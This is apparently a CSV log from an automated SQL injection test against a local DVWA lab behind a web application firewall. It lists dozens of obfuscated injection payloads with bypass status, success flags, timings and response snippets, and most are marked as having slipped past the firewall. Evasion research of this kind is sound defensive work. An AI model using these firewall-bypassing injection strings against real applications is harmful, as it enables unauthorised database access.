Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1.+or%0bnot%7efalse=%0b(!%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0407,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+0=+(!%0b{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0237,70.06,No,500,
0%27<@!=1+||+!~0=%0b(false)+or',Bypassed,No,None,booleanAtk,0.03,70.06,No,500,
0'<@=1.%0bor%0bnot+true=+(!+{x+(select+1)}=1)+||',Bypassed,No,None,booleanAtk,0.0163,70.06,No,500,
0%27<@=1.%0bor+not%0btrue=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.015,70.06,No,500,
0%27||%0b!@<@.+or+{x%0b(select%0b1)}=1+like%0btrue%0bor',Bypassed,No,None,booleanAtk,0.0179,70.06,No,500,
0%27<@=1%0b||+{x+(select+1)}=1+like+{a%0b1}=1%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0193,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+!+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0366,70.06,No,500,
0%27<@=.1+or+!%0b{`if`%0b1}=1=+(not+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0266,70.06,No,500,
0%27<@=1.+||%0bnot+{x+(select%0b1)}=1=+(not%7efalse)--+,Blocked,No,None,piggyAtk,0.022,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or%0bnot%0b{`if`%0b1}=1=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.014,70.14,No,500,
0'<@=1%0bor+!%0b{x+(select+1)}=1=+(not+1)%23,Bypassed,No,None,piggyAtk,0.0393,70.49,No,500,
0'<@=.1%0bor%0bnot%0b{x%0b(select+1)}=1=+(not%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0321,70.75,No,500,
0%27<@!=.1%0bor+not+true=%0b(not%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0222,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0b!+{a%0b1}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0225,70.75,No,500,
0%27<@=1.%0b||+{`if`+1}=1%0blike%0b{x%0b(select+1)}=1--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0359,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+not%7e0=%0b(not%0b1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0143,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0291,69.44,No,500,
0%27<@=.1+or+!%0btrue=%0b(not+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0152,69.91,No,500,
0%27<@=1%0b||+not%0b{a%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0192,69.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||+not%0b{a+1}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0304,69.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+not+{`if`%0b1}=1=+(!%0b{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0413,69.91,No,500,
0%27<@!=.1+||+!+true=+(!%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.024,69.98,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+true=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0299,70.06,No,500,
0%27<@!=.1+||+not%0b{a+1}=1=+(0)--+,Blocked,No,None,piggyAtk,0.0208,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+{x+(select%0b1)}=1%0blike%0b{x%0b(select+1)}=1+or',Blocked,No,None,Unknown,0.0158,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!+{x+(select+1)}=1=%0b(!%0btrue)%0b||%27,Bypassed,No,None,Unknown,0.0183,70.06,No,500,
0'<@=1.+or%0bnot+{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0211,70.06,No,500,
0%27<@=.1%0b||%0bnot+{`if`+1}=1=+(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0165,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0294,70.06,No,500,
0'<@!=1.+or+!+{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0164,70.06,No,500,
0%27<@=1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0175,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+{x%0b(select%0b1)}=1+like%0b{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0184,70.06,No,500,
0'<@=.1+||+!%0b{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0296,70.06,No,500,
0%27<@=.1%0b||%0b!%0b1=+(!%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0131,70.06,No,500,
0%27<@!=.1%0b||+{x%0b(select%0b1)}=1+like+true+||',Bypassed,No,None,Unknown,0.0079,70.06,No,500,
0'<@=1.+or%0bnot%0b{`if`+1}=1=%0b(not%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.021,70.06,No,500,
0'or+1<@.+or%0b!%0b{x%0b(select+1)}=1=+(!%0b1)+or%27,Bypassed,No,None,Unknown,0.0293,70.06,No,500,
0'<@=1.%0b||%0b{x+(select%0b1)}=1+like%0b{`if`+1}=1--+,Bypassed,No,None,piggyAtk,0.0209,70.06,No,500,
0%27<@=1.%0bor+!%7efalse=+(!+1)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0244,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot%0b{`if`+1}=1=%0b(not~false)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0227,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot%0b{x+(select+1)}=1=+(not~0)+or',Bypassed,No,None,Unknown,0.0267,70.06,No,500,
0%27<@=1+||%0bnot+{x%0b(select%0b1)}=1%0bis+false+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0267,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||%0b!+{`if`+1}=1=%0b(not+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0289,70.06,No,500,
0%27<@!=1+||+not+{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0206,70.06,No,500,
0%27<@!=.1+||%0b!%0b{x%0b(select+1)}=1=%0b(not+true)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0236,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0b0=%0b(!+{x+(select+1)}=1)--%0b,Blocked,No,None,piggyAtk,0.0138,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0b||%0b!%0b1=%0b(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0311,70.06,No,500,
0%27<@!=1+||%0bnot%7e0=+(!+{x+(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.0315,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0283,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+{a+1}=1=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0186,70.06,No,500,
0'<@=1%0bor%0b!+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0233,70.06,No,500,
0'<@!=1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.029,70.06,No,500,
0'<@!=1+||+not+{a+1}=1=+(!+{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0314,70.06,No,500,
0'<@!=.1%0bor+not%0btrue=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0272,70.06,No,500,
0'<@!=1.+or+!+{`if`%0b1}=1=+(!%0btrue)--%0b,Bypassed,No,None,piggyAtk,0.0207,70.06,No,500,
0%27<@!=1+or+not%0b{x%0b(select+1)}=1+is%0bfalse--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0273,70.06,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+{x%0b(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0233,70.06,No,500,
0'<@=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0198,70.06,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or+!%0btrue=%0b(not+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0329,70.06,No,500,
0%27<@!=1%0bor+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0341,70.14,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b!+{x%0b(select+1)}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0358,70.49,No,500,
0'<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0325,70.75,No,500,
0%27<@!=.1%0b||+!%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0366,70.75,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+not+{`if`%0b1}=1=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.02,70.75,No,500,
0'<@=1+||+not%0b{x+(select%0b1)}=1=%0b(not~false)+||',Bypassed,No,None,Unknown,0.0196,70.75,No,500,
0'<@!=.1+or+!+{x+(select+1)}=1=+(not%0b{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0136,70.75,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)--+,Blocked,No,None,piggyAtk,0.0234,69.44,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+not+{x+(select+1)}=1=+(!~false)%0bor%27,Bypassed,No,None,booleanAtk,0.0273,69.91,No,500,
0%27<@!=1+or+!+true=+(not+{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0328,69.91,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot%7efalse=%0b(!+{a+1}=1)--%0b,Blocked,No,None,piggyAtk,0.0111,69.91,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
